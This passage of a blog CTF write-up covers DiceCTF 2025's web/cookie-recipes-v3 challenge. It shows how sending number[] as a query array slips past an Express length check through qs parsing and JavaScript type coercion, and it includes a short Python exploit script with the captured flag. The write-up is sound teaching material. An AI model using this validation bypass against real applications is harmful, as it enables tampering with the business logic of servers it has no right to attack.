</span></span></code></pre></div><p>The backend is a small Express.js app with no authentication or database ‚Äî just an in-memory <code>Map</code> to store cookie counts per user. Each visitor gets a <code>user</code> cookie set via middleware if it doesn‚Äôt already exist, and this ID is used as the key to track how many cookies they‚Äôve baked.</p><p>There are two main endpoints that matter here:</p><ul><li><code>POST /bake</code>: accepts a <code>number</code> parameter in the query string, increments the user‚Äôs cookie count accordingly ‚Äî but only if <code>number.length &lt;= 2</code>.</li><li><code>POST /deliver</code>: checks if the user has reached <strong>one billion</strong> cookies. If so, it returns the flag; otherwise, it just tells you how many more you need.</li></ul><p>How do I know they matter? Well, because one serves the flag, and the other allows user input to be passed.</p><p>Looking closer, The server doesn‚Äôt validate the type of <code>number</code>, only its <strong>length</strong>. That might seem restrictive, so let&rsquo;s check <a href=https://expressjs.com/en/5x/api>express</a> docs for more info.</p><p><img alt=qs-expressjs-docs loading=lazy src=/blog/images/2025-04-12-12-22-31.png></p><p>Something in red, yay! Let‚Äôs take a closer look at how <code>req.query.number</code> is actually interpreted.</p><h2 id=task-analysis>Task Analysis<a hidden class=anchor aria-hidden=true href=#task-analysis>#</a></h2><p>Admittedly, I took the hardest route when solving the challenge on remote, and when I tried to solve it locally, it didn&rsquo;t work xD.</p><p>Only after some time did I realize what was wrong: ExpressJS version 5.x mitigates the vulnerability (or feature?) I&rsquo;m about to discuss. I found another (simpler and more effective) solution <a href=https://github.com/PwnOfPower/DiceCTF_Quals_2025/tree/main/web/cookie-recipes-v3>here</a></p><div style="padding:1rem;margin:1rem 0;border-left:4px solid;border-radius:.5rem;background-color:#1e293b;border-color:#38bdf8;color:#e5e7eb;font-size:.95rem;line-height:1.5;font-family:system-ui,sans-serif">Tip: The solution above works because NaN compared to any numeric value returns false.</div><p>Let&rsquo;s now proceed with my solution, elegant and highlights my overthinking nature LOL.</p><p><img alt=overthinking-meme loading=lazy src=/blog/images/2025-04-12-12-24-34.png></p><hr><p>We focus on this code block:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>number</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;=</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>cookies</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>,</span> <span class=p>(</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span> <span class=o>??</span> <span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=nb>Number</span><span class=p>(</span><span class=nx>number</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>).</span><span class=nx>toString</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The check only limits the <code>.length</code> of <code>number</code>. Suspecting Express uses the <code>qs</code> module for query parsing <code>(req.query)</code>,
we can test that by creating our own ExpressJS environnment, parse a query string using both express and qs and compare the results.</p><ol><li>Set up the environnment:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>npm init -y
</span></span><span class=line><span class=cl>npm install express@4.15.0
</span></span></code></pre></div><ol start=2><li>Set a simple web server to test the hypotheses:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>qs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;qs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>queryExpress</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>;</span> <span class=c1>// the parsed req.query from expressjs
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>queryQS</span> <span class=o>=</span> <span class=nx>qs</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=s1>&#39;a[]=b&#39;</span><span class=p>);</span>  <span class=c1>// the parsed req.query from qs
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>queryQS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>queryExpress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=mi>3000</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Server listening at http://localhost:3000`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><ol start=3><li>Test our hypotheses:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl <span class=s2>&#34;http://localhost:3000/?a[]=b&#34;</span>
</span></span></code></pre></div><p>Gives:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>web/cookie-recipes-v3/playground via Óúò v20.19.0
</span></span><span class=line><span class=cl>‚ûú node index.js
</span></span><span class=line><span class=cl>Server listening at http://localhost:3000
</span></span><span class=line><span class=cl><span class=o>{</span> a: <span class=o>[</span> <span class=s1>&#39;b&#39;</span> <span class=o>]</span> <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>{</span> a: <span class=o>[</span> <span class=s1>&#39;b&#39;</span> <span class=o>]</span> <span class=o>}</span>
</span></span></code></pre></div><p>Great! express uses the <code>qs</code> module to parse query strings, not Node&rsquo;s default querystring.
Let&rsquo;s check <a href="https://github.com/ljharb/qs?tab=readme-ov-file#parsing-arrays">qs</a> documentation to see what we can do with this.</p><hr><p>It turns out that <code>qs</code> supports parsing of nested objects, arrays, and more. For example:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>a[]=b
</span></span></code></pre></div><p>gets parsed into:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=p>{</span> <span class=nx>a</span><span class=o>:</span> <span class=p>[</span><span class=s2>&#34;b&#34;</span><span class=p>]</span> <span class=p>}</span>
</span></span></code></pre></div><p>So how does this help in our challenge?</p><p>If we revisit the original code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>number</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;=</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>cookies</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>,</span> <span class=p>(</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span> <span class=o>??</span> <span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=nb>Number</span><span class=p>(</span><span class=nx>number</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>).</span><span class=nx>toString</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We can see that the check is on <code>number.length &lt;= 2</code>. If <code>number</code> is a string like <code>"100"</code>, the check fails (<code>length = 3</code>). But if we send <code>number[]=</code> in the query string, Express (via <code>qs</code>) parses that into an array. Arrays in JavaScript have a <code>.length</code> property, and we can ensure that property is <code>&lt;= 2</code> by only providing one or two elements ‚Äî like <code>number[]=1000000000</code>.</p><p>So, even though the check is still in place, we bypass it by controlling the input type ‚Äî an array instead of a string. Now we just need to understand how JavaScript handles <code>Number(array)</code>.</p><hr><p>You could experiment with different inputs to find the answer quickly, but let‚Äôs take a deeper dive into JavaScript&rsquo;s internal workings, specifically focusing on its implicit type conversion feature.</p><blockquote><p>You can skip this section and move straight to the exploitation if you&rsquo;re already familiar with the details of type conversion.</p></blockquote><hr><p>When the <code>Number()</code> function is called, it converts its argument into a number following these steps:</p><ol><li>If the argument is already a <code>Number</code>, it simply returns that number.</li><li>If the argument is a <code>String</code>, it converts the string to a number (via <code>StringToNumber()</code>).</li><li>If the argument is an <strong>object</strong> (which is the case for arrays in JavaScript), it calls the <code>ToPrimitive()</code> function.</li></ol><p><code>ToPrimitive()</code> is invoked implicitly when we pass an object, and what does it do?</p><p>As the name suggests, this function converts an object to a primitive value (either a string or a number), and it does so by calling <code>OrdinaryToPrimitive</code>. This function takes the object and a preferred type (by default, <code>number</code>).</p><p><code>OrdinaryToPrimitive</code> proceeds as follows:</p><ol><li>It first calls the object&rsquo;s <code>valueOf()</code> method, which, in the case of arrays, returns the array itself.</li><li>If that doesn&rsquo;t provide a suitable primitive, it then calls the object&rsquo;s <code>toString()</code> method, which returns the string representation of the array.</li></ol><blockquote><p><code>.valueOf()</code> returns the array itself because that&rsquo;s how JavaScript&rsquo;s <code>Array.prototype.valueOf()</code> is defined in the spec.</p></blockquote><blockquote><p>You can read more about <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf>Object.prototype.valueOf()</a> and <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString>Object.prototype.toString()</a> to understand how they work.</p></blockquote><p>So, what‚Äôs happening here? When an array is passed to <code>Number()</code>, it is first converted to a string (via <code>toString()</code>), and then that string is passed to <code>Number()</code>, which converts it to a number using <code>StringToNumber()</code>.</p><p>This process of implicit coercion explains how we can pass an array to <code>Number()</code> and still get the correct numeric result.</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Armed with this newfound knowledge, we know exactly what to do: we need to craft a payload that, when converted to a string, results in a number that won‚Äôt cause issues for the <code>Number()</code> function.</p><p>The payload will look like this:</p><div class="goat svg-container"><svg font-family="Menlo,Lucida Console,monospace" viewBox="0 0 496 25"><g transform="translate(8,16)"><path d="M156 8V24" fill="none" stroke="currentcolor"/><path d="M164 8V24" fill="none" stroke="currentcolor"/><text text-anchor="middle" x="0" y="4" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="8" y="4" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="16" y="4" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="24" y="4" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="32" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="40" y="4" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="48" y="4" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="56" y="4" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="64" y="4" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="72" y="4" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="96" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="104" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="112" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="136" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="4" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="184" y="4" fill="currentcolor" style="font-size:1em">T</text><text text-anchor="middle" x="192" y="4" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="200" y="4" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="208" y="4" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="224" y="4" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="232" y="4" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="248" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="256" y="4" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="264" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="280" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="288" y="4" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="296" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="304" y="4" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="312" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="328" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="336" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="344" y="4" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="352" y="4" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="360" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="368" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="384" y="4" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="392" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="400" y="4" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="408" y="4" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="416" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="432" y="4" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="440" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="456" y="4" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="464" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="472" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="480" y="4" fill="currentcolor" style="font-size:1em">d</text></g></svg></div><p>Now, to submit this query string, we can create a simple Python script that will interact with the server and retrieve the flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;https://cookie.dicec.tf&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Start a session to maintain cookies across requests</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Send the payload to the /bake endpoint</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/bake&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;number[]&#34;</span><span class=p>:</span> <span class=s2>&#34;100000000000000&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Send a request to the /deliver endpoint to fetch the flag</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/deliver&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>  <span class=c1># Print the flag</span>
</span></span></code></pre></div><p>This script sends the payload to the server, which, after processing, returns the flag in the response.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/tmp via üêç v3.13.2 took 2s
</span></span><span class=line><span class=cl>‚ûú python exploit.py
</span></span><span class=line><span class=cl>dice<span class=o>{</span>cookie_cookie_cookie<span class=o>}</span>
</span></span></code></pre></div><p>Flag is: <code>dice{cookie_cookie_cookie}</code></p><p><img alt=celebration loading=lazy src=/blog/images/2025-04-12-12-35-09.png></p><h2 id=conclusions>Conclusions<a hidden class=anchor aria-hidden=true href=#conclusions>#</a></h2><p>What we learned in this challenge:</p><ol><li><p><strong>Type Coercion in JavaScript</strong>: Understanding how JavaScript implicitly converts objects to primitives (e.g., arrays to strings) is crucial in exploiting type-based vulnerabilities.</p></li><li><p><strong>Query String Parsing</strong>: Knowing how libraries like <code>qs</code> differ from default query parsing allows manipulation of input data to bypass security checks.</p></li><li><p><strong>Array Behavior</strong>: Recognizing how arrays handle <code>.length</code> and conversion to string helps in crafting inputs that pass validation checks.</p></li><li><p><strong>Implicit Conversion</strong>: Realizing the role of implicit functions like <code>ToPrimitive()</code> and <code>OrdinaryToPrimitive()</code> in type conversion clarifies the behavior of complex data types in JavaScript.</p></li></ol><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><p>If you&rsquo;re interested to learn more, here is a list of useful references:</p><ol><li><p><strong><a href=https://expressjs.com/en/5x/api#req.body>Express.js API - req.body</a></strong>: Understanding how Express parses and handles request bodies is essential for analyzing how input is processed in the challenge.</p></li><li><p><strong><a href=https://www.npmjs.com/package/qs>qs - Query String Parsing Library</a></strong>: This explains how the <code>qs</code> library parses query strings, which is key to understanding the behavior of the vulnerable application in the challenge.</p></li><li><p><strong><a href=https://en.wikipedia.org/wiki/Query_string>Query String (Wikipedia)</a></strong>: Provides general background on how query strings work, which helps in understanding the significance of query parameters in the exploit.</p></li><li><p><strong><a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Equality_comparisons_and_sameness>JavaScript Equality Comparisons and Sameness (MDN)</a></strong>: Details the behavior of equality operators, helping to understand how JavaScript compares values and objects in the challenge.</p></li><li><p><strong><a href=https://tc39.es/ecma262/multipage/abstract-operations.html#sec-toprimitive>TC39 - ToPrimitive</a></strong>: The official specification describing how JavaScript converts objects to primitive values, which is central to the implicit type conversion used in the exploit.</p></li><li><p><strong><a href=https://tc39.es/ecma262/multipage/abstract-operations.html#sec-tonumber>TC39 - ToNumber</a></strong>: The specification for converting values to numbers, explaining how JavaScript handles conversion when objects (like arrays) are passed to the <code>Number()</code> function.</p></li><li><p><strong><a href="https://github.com/ljharb/qs?tab=readme-ov-file#parsing-arrays">qs - Parsing Arrays</a></strong>: Offers insights into how the <code>qs</code> library parses arrays in query strings, which is essential for understanding how the exploit works when using arrays.</p></li><li><p><strong><a href=https://tc39.es/ecma262/multipage/ecmascript-language-expressions.html#sec-addition-operator-plus-runtime-semantics-evaluation>JavaScript Addition Operator (TC39)</a></strong>: Describes how the addition operator works, particularly when involving coercion, which is part of the exploit when handling arrays and numbers.</p></li><li><p><strong><a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number>Number Constructor (MDN)</a></strong>: Explains how the <code>Number()</code> function behaves, specifically when dealing with arrays and how they are converted into numbers.</p></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/dice/>Dice</a></li></ul><nav class=paginav><a class=prev href=https://hxuu.github.io/blog/ctf/dice25/pyramid/><span class=title>¬´ Prev</span><br><span>Dice25: Writeup for web/pyramid</span>
</a><a class=next href=https://hxuu.github.io/blog/ctf/utctf/number-champ/><span class=title>Next ¬ª</span><br><span>UTCTF25 - Number Champ (WEB)</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Dice25: Writeup for web/cookie-recipes-v3 on x" href="https://x.com/intent/tweet/?text=Dice25%3a%20Writeup%20for%20web%2fcookie-recipes-v3&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fdice25%2fcookie-recipes-v3%2f&amp;hashtags=ctf%2cwrite-up%2cdice"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Dice25: Writeup for web/cookie-recipes-v3 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fdice25%2fcookie-recipes-v3%2f&amp;title=Dice25%3a%20Writeup%20for%20web%2fcookie-recipes-v3&amp;summary=Dice25%3a%20Writeup%20for%20web%2fcookie-recipes-v3&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fdice25%2fcookie-recipes-v3%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Dice25: Writeup for web/cookie-recipes-v3 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fdice25%2fcookie-recipes-v3%2f&title=Dice25%3a%20Writeup%20for%20web%2fcookie-recipes-v3"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Dice25: Writeup for web/cookie-recipes-v3 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fdice25%2fcookie-recipes-v3%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Dice25: Writeup for web/cookie-recipes-v3 on whatsapp" href="https://api.whatsapp.com/send?text=Dice25%3a%20Writeup%20for%20web%2fcookie-recipes-v3%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fdice25%2fcookie-recipes-v3%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Dice25: Writeup for web/cookie-recipes-v3 on telegram" href="https://telegram.me/share/url?text=Dice25%3a%20Writeup%20for%20web%2fcookie-recipes-v3&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fdice25%2fcookie-recipes-v3%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 